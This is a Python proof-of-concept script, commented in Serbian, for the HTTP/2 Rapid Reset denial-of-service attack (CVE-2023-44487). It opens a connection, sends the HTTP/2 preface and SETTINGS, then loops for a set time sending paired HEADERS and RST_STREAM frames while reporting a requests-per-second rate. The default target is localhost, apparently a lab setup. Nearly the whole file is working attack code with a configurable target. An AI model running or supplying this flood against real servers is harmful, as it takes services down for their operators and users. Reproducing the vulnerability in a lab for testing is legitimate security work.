import socket
import ssl
import time

# HTTP/2 frame types
HEADERS_FRAME = 0x01
RST_STREAM_FRAME = 0x03

# HTTP/2 preface (mora se poslati prvo)
HTTP2_PREFACE = b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n'

def create_frame(frame_type, flags, stream_id, payload):
    """Kreira HTTP/2 frame"""
    length = len(payload)
    # Frame header: 3 bytes length, 1 byte type, 1 byte flags, 4 bytes stream ID
    frame = (
        length.to_bytes(3, 'big') +
        frame_type.to_bytes(1, 'big') +
        flags.to_bytes(1, 'big') +
        stream_id.to_bytes(4, 'big') +
        payload
    )
    return frame

def create_headers_frame(stream_id):
    """Kreira minimalni HEADERS frame za GET zahtev"""
    # Ovo je pojednostavljena verzija - u realnosti bi trebalo HPACK encoding
    # Ali za demo je dovoljno da server primi bilo šta što liči na zahtev
    headers = (
        b'\x00\x00\x00\x00'  # Pseudo-headers placeholder
    )
    return create_frame(HEADERS_FRAME, 0x05, stream_id, headers)  # 0x05 = END_STREAM | END_HEADERS

def create_rst_stream_frame(stream_id):
    """Kreira RST_STREAM frame koji otkazuje stream"""
    # Error code: 0x00000000 (NO_ERROR)
    payload = b'\x00\x00\x00\x00'
    return create_frame(RST_STREAM_FRAME, 0x00, stream_id, payload)

def rapid_reset_attack(host, port, duration_seconds=10):
    """
    Izvodi Rapid Reset napad
    
    Args:
        host: IP ili hostname servera
        port: Port servera
        duration_seconds: Koliko dugo traje napad
    """
    print(f"[*] Connecting to {host}:{port}")
    
    # Kreiraj TCP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    
    # Pošalji HTTP/2 preface
    sock.sendall(HTTP2_PREFACE)
    print("[+] Sent HTTP/2 preface")
    
    # Pošalji SETTINGS frame (prazan, ali potreban za validnu konekciju)
    settings_frame = create_frame(0x04, 0x00, 0, b'')  # SETTINGS frame
    sock.sendall(settings_frame)
    print("[+] Sent SETTINGS frame")
    
    stream_id = 1  # HTTP/2 stream ID-evi počinju od 1
    start_time = time.time()
    request_count = 0
    
    print(f"[*] Starting Rapid Reset attack for {duration_seconds} seconds...")
    print("[*] Sending HEADERS + RST_STREAM pairs in rapid succession")
    
    try:
        while time.time() - start_time < duration_seconds:
            # Pošalji HEADERS frame (otvori stream)
            headers_frame = create_headers_frame(stream_id)
            sock.sendall(headers_frame)
            
            # ODMAH pošalji RST_STREAM (otkaži stream)
            rst_frame = create_rst_stream_frame(stream_id)
            sock.sendall(rst_frame)
            
            request_count += 1
            stream_id += 2  # HTTP/2 client stream ID-evi moraju biti neparni
            
            # Svakih 1000 zahteva isprintaj progress
            if request_count % 1000 == 0:
                elapsed = time.time() - start_time
                rate = request_count / elapsed
                print(f"[*] Sent {request_count} request/reset pairs ({rate:.0f} req/sec)")
        
    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        sock.close()
        elapsed = time.time() - start_time
        rate = request_count / elapsed
        print(f"\n[+] Attack completed!")
        print(f"[+] Total requests: {request_count}")
        print(f"[+] Duration: {elapsed:.2f} seconds")
        print(f"[+] Average rate: {rate:.0f} requests/second")

if __name__ == "__main__":
    # Konfiguracija 
    #TARGET_HOST = "host.docker.internal"  # Ovo je Docker magic hostname koji pokazuje na Windows host
    TARGET_HOST = "localhost"
    TARGET_PORT = 8080
    DURATION = 30  # 30 sekundi napada
    
    print("=" * 60)
    print("HTTP/2 Rapid Reset Attack PoC")
    print("CVE-2023-44487")
    print("=" * 60)
    
    rapid_reset_attack(TARGET_HOST, TARGET_PORT, DURATION)
